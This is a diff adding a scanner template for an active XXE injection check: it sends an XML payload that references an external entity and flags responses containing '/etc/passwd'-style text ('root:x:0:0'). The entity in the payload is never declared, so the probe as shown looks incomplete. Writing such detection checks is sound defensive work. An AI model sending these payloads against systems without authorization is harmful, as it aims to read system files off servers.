@@ -1,0 +1,21 @@
+id: xxe-024
+name: 'XXE via payload'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via payload'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      payload:
+        - '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><r>&xxe;</r></rdf:RDF>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
